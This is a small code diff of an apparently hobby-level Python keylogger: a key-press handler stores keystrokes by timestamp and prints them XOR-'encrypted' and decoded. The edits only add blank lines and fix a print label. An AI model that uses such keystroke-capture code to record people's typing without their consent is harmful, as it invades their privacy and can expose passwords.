@@ -17,6 +17,8 @@ def on_key_press(key):
         dicti[currentTime] = ''
 
     dicti[currentTime] += key
+
+
     dicti_for_show["all times"] += key
 
 
@@ -38,7 +40,7 @@ def on_key_press(key):
 
             xor_retutn = xor_on_key(v, 7)         #Sending the value to the xor cipher.
             print("encrypted:",xor_retutn, end="\n")     #Print the encrypted value.
-            print("decoded",v,end = "\n")                   #Print the decoded value.
+            print("decoded:",v,end = "\n")                   #Print the decoded value.
 
         dicti = {}
         dicti_for_show = {"all times": ''}
